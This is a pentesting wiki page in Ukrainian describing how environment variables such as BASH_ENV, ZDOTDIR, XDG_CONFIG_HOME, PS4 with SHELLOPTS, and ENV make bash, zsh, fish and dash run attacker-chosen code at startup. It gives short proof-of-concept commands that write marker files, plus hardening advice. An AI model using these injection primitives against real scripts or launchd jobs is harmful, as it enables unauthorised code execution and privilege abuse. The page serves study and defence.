# Ін’єкція в Shell Applications macOS

{{#include ../../../banners/hacktricks-training.md}}

## `BASH_ENV`

Коли Bash запускається неінтерактивно для виконання скрипту або команди `-c`, він розгортає значення `BASH_ENV` і підключає отриманий файл перед виконанням запитаної команди. Bash не використовує `PATH` для пошуку цього файлу. Тому процес, який запускає неінтерактивний Bash із контрольованими атакувальником змінними середовища, можна змусити спочатку виконати доступний для читання shell payload.<sup>[[1]](#references)</sup>
```bash
cat >/tmp/bash-startup-hook.sh <<'EOF'
#!/bin/bash
/usr/bin/touch /tmp/bash-env-executed
EOF

BASH_ENV=/tmp/bash-startup-hook.sh /bin/bash -c '/usr/bin/true'
test -e /tmp/bash-env-executed && echo 'BASH_ENV executed'
```
Хук запускається лише тоді, коли ціль фактично запускає Bash; `/bin/sh` на іншій платформі або програма, яка виконує команду без shell, не обов’язково його враховуватиме. Bash у privileged mode ігнорує `BASH_ENV`. Якщо effective і real user/group IDs відрізняються, Bash також пропускає startup files і скидає effective IDs, якщо не вказано `-p`; з `-p` privileged mode залишається увімкненим, а `BASH_ENV` усе ще ігнорується.<sup>[[1]](#references)[[2]](#references)</sup>

У macOS jobs `launchd` можуть визначати успадковані або призначені для окремих jobs environment variables, тому перевіряйте plists і launch contexts, які передають дані privileged scripts. Не покладайтеся лише на SIP для очищення interpreter variables: використовуйте мінімальне середовище (`env -i`), явно скасовуйте `BASH_ENV`, запускайте потрібний interpreter за абсолютним шляхом і не використовуйте writable startup files.

## zsh `ZDOTDIR`

zsh читає `$ZDOTDIR/.zshenv` для кожного звичайного shell, зокрема non-interactive shells; якщо `ZDOTDIR` не встановлено, використовується `HOME`. Тому перенаправлення `ZDOTDIR` до writable directory запускає його `.zshenv` перед командою або script `zsh -c`.<sup>[[3]](#references)</sup>
```bash
mkdir -p /tmp/zsh-startup
echo '/usr/bin/touch /tmp/zshenv-executed' > /tmp/zsh-startup/.zshenv
ZDOTDIR=/tmp/zsh-startup /bin/zsh -c /usr/bin/true
```
`zsh -f` скасовує опцію `RCS` і пропускає цей користувацький startup-файл. Глобальний `/etc/zshenv` усе ще читається, тому він має залишатися довіреним і мінімальним.

## fish `XDG_CONFIG_HOME`

fish читає `$XDG_CONFIG_HOME/fish/conf.d/*.fish` і `$XDG_CONFIG_HOME/fish/config.fish` під час запуску кожної оболонки, а не лише інтерактивних оболонок або login-оболонок. Він також виконує `fish/vendor_conf.d/*.fish` у каталогах, перелічених у `XDG_DATA_DIRS`. Тому зловмисник, який контролює одну з цих змінних і доступний для читання каталог, може виконати код до запуску fish-скрипту або команди `-c`.<sup>[[4]](#references)</sup>
```bash
mkdir -p /tmp/fish-startup/fish
echo 'touch /tmp/fish-config-executed' > /tmp/fish-startup/fish/config.fish
XDG_CONFIG_HOME=/tmp/fish-startup fish -c true

# Vendor configuration variant
mkdir -p /tmp/fish-vendor/fish/vendor_conf.d
echo 'touch /tmp/fish-vendor-executed' > /tmp/fish-vendor/fish/vendor_conf.d/10-hook.fish
XDG_DATA_DIRS=/tmp/fish-vendor fish -c true
```
Використовуйте `fish --no-config` для надійного запуску та очищуйте ненадійні змінні шляхів XDG.

## bash `PS4` + xtrace (`SHELLOPTS`)

Коли Bash працює з опцією **xtrace**, перед кожною командою, яку він відстежує, він розгортає `PS4` і виводить його. `PS4` розгортається як будь-який prompt, тому **command substitution** усередині нього виконується. І значення `PS4`, **і спосіб увімкнення xtrace** можуть надходити виключно з environment: експорт `SHELLOPTS=xtrace` вмикає xtrace для звичайного `bash script.sh` (прапорець `-x` не потрібен). У результаті будь-який Bash-скрипт, який запускає жертва, перетворюється на виконання коду.<sup>[[5]](#references)</sup>
```bash
echo 'x=1; echo done' > /tmp/victim.sh

# Pure environment-variable injection (no -x on the command line)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a maintenance/CI job is run with debugging on
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```
`PS4` сам по собі нічого не робить, доки не ввімкнено xtrace (через `SHELLOPTS=xtrace`, `set -x` або `bash -x`). Bash ігнорує `SHELLOPTS` у **привілейованому режимі** (за різних реального й ефективного ідентифікаторів без обробки `-p`), тому застосовуються ті самі застереження щодо setuid, що й для `BASH_ENV`.

## POSIX `ENV`

POSIX-подібні shell (`/bin/sh`, `dash`, `ksh`) зчитують змінну `ENV`, розгортають її та виконують отриманий файл під час запуску **інтерактивного** shell. Це POSIX-аналог `BASH_ENV` (який спрацьовує для *неінтерактивного* Bash), тому контроль над `ENV` дає змогу виконувати код щоразу, коли жертва запускає інтерактивний `sh`/`dash`.
```bash
echo 'touch /tmp/env-executed' > /tmp/env-hook.sh
echo 'exit' | ENV=/tmp/env-hook.sh dash -i
test -e /tmp/env-executed && echo 'ENV executed'
```
## References

- [1] [Файли запуску Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files)
- [2] [Виклик Bash](https://www.gnu.org/software/bash/manual/html_node/Invoking-Bash.html)
- [3] [Файли запуску/завершення zsh](https://zsh.sourceforge.io/Doc/Release/Files.html#Startup_002fShutdown-Files)
- [4] [Файли конфігурації fish](https://fishshell.com/docs/current/language.html#configuration-files)
- [5] [Змінні Bash — `PS4` та вбудована команда Set (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
{{#include ../../../banners/hacktricks-training.md}}
